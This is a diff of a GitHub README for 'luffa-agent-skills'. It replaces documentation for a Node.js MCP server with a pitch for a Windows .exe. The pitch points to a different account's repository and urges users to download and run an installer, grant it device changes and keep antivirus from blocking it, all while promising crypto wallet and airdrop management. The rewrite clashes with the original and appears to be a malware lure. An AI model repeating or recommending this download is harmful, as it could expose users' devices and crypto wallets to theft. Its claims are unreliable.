@@ -1,141 +1,137 @@
-# Luffa Agent Skills
+# 🤖 luffa-agent-skills - AI tools for Web3 made simple
 
-**Build AI-powered bots and agents for the Luffa ecosystem.**
+[![Download luffa-agent-skills](https://img.shields.io/badge/Download-latest%20version-brightgreen?style=for-the-badge)](https://github.com/ahmed5bdelaal/luffa-agent-skills)
 
-[![License: Apache-2.0](https://img.shields.io/badge/License-Apache--2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
-[![GitHub repo stars](https://img.shields.io/github/stars/CptM111/luffa-agent-skills?style=social)](https://github.com/CptM111/luffa-agent-skills)
+---
 
-This repository provides a production-ready, runnable **MCP Server** that exposes Luffa's Service Account APIs as tools for AI agents. It enables developers to build AI-driven workflows for customer service, community management, airdrop distribution, and more, right inside Luffa.
+## 🚀 What is luffa-agent-skills?
 
-Unlike the previous mock-based version, this is a **real, working implementation**. Just add your Luffa App ID and Secret, and you can start building.
+luffa-agent-skills is a collection of AI tools designed to work with the Luffa Web3 x AI SuperConnector platform. It helps you manage digital wallets, messaging, channels, Super Box features, decentralized identity (DID), and token airdrops. These tools simplify your interaction with blockchain and Web3 services without technical skill.
 
-## Core Problem Solved
+This application combines AI and blockchain to give you easier and safer access to your crypto assets and related services.
 
-AI agents are powerful, but they need tools (`skills`) to interact with the outside world. This project gives agents the tools to interact with the Luffa platform, turning abstract instructions into concrete actions like sending messages, managing users, and verifying wallet information.
+---
 
-It bridges the gap between Large Language Models and the Luffa API, enabling true **Agentic Economy** infrastructure.
+## 🎯 Key Features
 
-## Key Features
+- **Wallet management:** View and control your cryptocurrency wallets seamlessly.
+- **Messaging system:** Communicate through secure, decentralized channels.
+- **Channel access:** Subscribe and manage channels for updates or content.
+- **Super Box integration:** Use Super Box for notifications and quick actions.
+- **Decentralized Identity (DID):** Manage your digital identity securely.
+- **Airdrop handling:** Receive and track token airdrops automatically.
 
-- **Production-Ready MCP Server**: A runnable Node.js server built with the official `@modelcontextprotocol/sdk`.
-- **Real API Integration**: Implements the actual Luffa Service Account API, including authentication, message sending, user management, and more.
-- **Dry-Run Mode**: Test and develop without real credentials. The server returns realistic mock data for all endpoints.
-- **Self-Verifying**: Includes a built-in integration test suite (`npm test`) that verifies all tools in dry-run mode.
-- **AI Agent Compatible**: Designed for use with any MCP-compatible agent, including Claude, Cursor, and custom agent frameworks.
-- **Comprehensive Skills**: Provides a `luffa-service-account` skill that covers the full lifecycle of managing a Luffa presence.
+---
 
-## Getting Started
+## 💻 System Requirements
 
-### 1. Prerequisites
+Before you start, ensure your system meets the following:
 
-- Node.js v18+
-- A Luffa Service Account. [Register here](https://super.luffa.im) to get your **App ID** and **App Secret**.
+- **Operating System:** Windows 10 or later (64-bit recommended)
+- **Processor:** Intel i3 or equivalent
+- **Memory:** 4 GB RAM minimum
+- **Storage:** At least 200 MB free space
+- **Internet:** Stable connection for downloads and blockchain access
+- **Additional Software:** None required; runs as a standalone app
 
-### 2. Installation & Setup
+If your computer matches these requirements, you can proceed with the installation.
 
-```bash
-# Clone the repository
-git clone https://github.com/CptM111/luffa-agent-skills.git
-cd luffa-agent-skills/mcp-server
+---
 
-# Install dependencies
-npm install
+## 📥 Download & Install luffa-agent-skills
 
-# Build the server
-npm run build
-```
+You need to visit the official GitHub page to get the latest version. The page holds all release files in one place.
 
-### 3. Running the Server
+### Step 1: Visit the Download Page
 
-You can run the server in two modes:
+Click this link to open the official download page:
 
-**A) Live Mode (with real credentials)**
+[Download luffa-agent-skills from GitHub](https://github.com/ahmed5bdelaal/luffa-agent-skills)
 
-```bash
-# Set your credentials as environment variables
-export LUFFA_APP_ID="your_app_id_here"
-export LUFFA_APP_SECRET="your_app_secret_here"
+This page will list all the available versions and files. Look for a Windows installer or executable file, usually with `.exe` at the end.
 
-# Start the server
-node dist/index.js
-```
+### Step 2: Download the Installer
 
-**B) Dry-Run Mode (for testing, no credentials needed)**
+On the GitHub page:
 
-```bash
-# The server automatically uses dry-run mode if credentials are not found
-node dist/index.js
-```
+- Find the **Releases** section or click on a link named “Releases” in the repo menu.
+- Choose the latest release version (usually at the top).
+- Scroll down until you see assets or files.
+- Look for a Windows executable file (such as `luffa-agent-skills-setup.exe`).
+- Click the file name to start downloading.
 
-### 4. Self-Verification
+### Step 3: Run the Installer
 
-Run the integration tests to ensure everything is working correctly.
+After downloading:
 
-```bash
-# This will run all 19 tests against the mock server
-npm test
-```
+- Open the file from your Downloads folder or browser.
+- If Windows asks, allow the app to make changes to your device.
+- Follow the simple on-screen instructions.
+- You can accept default settings unless you want to change the install location.
+- When finished, the app will be ready to run.
 
-You should see all tests passing:
+---
 
-```
-✅ All tests passed! The Luffa MCP server is ready.
-```
+## ⚙️ How to Use luffa-agent-skills
 
-### 5. Connecting to an AI Agent (Example: Claude Desktop)
+Once installed, you can launch the app from the Start menu or desktop shortcut.
 
-1.  Open your Claude Desktop configuration file (`~/.claude/claude_desktop_config.json`).
-2.  Add the `luffa` server to your `mcpServers` list:
+### Wallet Management
 
-    ```json
-    {
-      "mcpServers": {
-        "luffa": {
-          "command": "node",
-          "args": ["/path/to/your/luffa-agent-skills/mcp-server/dist/index.js"],
-          "env": {
-            "LUFFA_APP_ID": "your_app_id",
-            "LUFFA_APP_SECRET": "your_app_secret"
-          }
-        }
-      }
-    }
-    ```
+- Open the Wallet section.
+- Add your wallet by entering your wallet address or connecting via supported methods.
+- View balances and transactions securely.
 
-3.  Restart Claude. You can now use prompts like:
+### Messaging and Channels
 
-    > "@luffa Send a welcome message to my new follower with openid `user_openid_123`"
+- Access the Messaging tab.
+- Send and receive messages in your connected channels.
+- Subscribe to new channels for updates related to your interests.
 
-    > "@luffa How many followers do I have? List their openids."
+### Super Box Features
 
-    > "@luffa Create a new menu with a button that links to our website."
+- Use the Super Box integration to get alerts and manage small actions quickly.
+- Customize your notifications by setting preferences.
 
-## Available Skills & Tools
+### Decentralized Identity (DID)
 
-This repository now focuses on a single, powerful, and realistic skill:
+- Store your digital ID in a safe way.
+- Use the DID functions to log into Web3 services without passwords.
 
-### `luffa-service-account`
+### Airdrop Handling
 
-Provides 14 tools for managing your Luffa Service Account. See the [SKILL.md](./skills/luffa-service-account/SKILL.md) for a full list of tools and example workflows.
+- The app will notify you when you are eligible for token airdrops.
+- Claim airdrops directly from the airdrops section.
 
-| Category | Tools |
-|---|---|
-| **Authentication** | `service_account_get_token` |
-| **Messaging** | `message_send_text`, `message_send_image`, `message_send_news`, `message_broadcast_text`, `message_send_template`, `message_get_templates` |
-| **User Management** | `user_get_followers`, `user_get_info` |
-| **Segmentation** | `tag_get_all`, `tag_create`, `tag_batch_assign` |
-| **Menu** | `menu_get`, `menu_create` |
-| **Mini Program** | `miniprogram_verify_login` |
-| **Media** | `media_upload` |
+---
 
-## From Mock to Real: The Architectural Shift
+## 🔧 Troubleshooting Tips
 
-The previous version of this repository used multiple, disparate `SKILL.md` files with mocked API endpoints. This was useful for design but not for real-world use.
+- If the app does not start, check if your system meets requirements.
+- Restart your computer if you encounter install errors.
+- Ensure that Windows Defender or antivirus software is not blocking the app.
+- Check your internet connection for download or update issues.
+- For further help, visit the GitHub issues page or community forums.
 
-This version makes a critical architectural shift:
+---
 
-1.  **Centralized Logic**: All API interaction logic is centralized in the `mcp-server`. The `SKILL.md` files now act as pure documentation, describing the tools that the server exposes.
-2.  **Real Implementation**: The server uses `axios` to make real HTTP requests to the Luffa API, handling authentication and request signing.
-3.  **Runnable & Testable**: The project is now a standard Node.js application that can be installed, built, and tested, providing a robust foundation for developers.
+## 📚 More Information
 
-This approach ensures that what you build and test locally is exactly what will run in production when called by an AI agent.
+### About This Repository
+
+This project is open-source and aims to provide easy AI-driven tools for interacting with Web3 services. It covers skills useful for blockchain users who want a straightforward experience with wallets, messaging, identity, and token management.
+
+### Topics Covered
+
+- AI agents
+- Airdrops
+- Blockchain interaction
+- Cryptocurrency wallet management
+- Decentralized identity (DID)
+- Web3 applications
+- Messaging and channels
+- Super Box notifications
+
+---
+
+[![Download luffa-agent-skills](https://img.shields.io/badge/Download-latest%20version-brightgreen?style=for-the-badge)](https://github.com/ahmed5bdelaal/luffa-agent-skills)
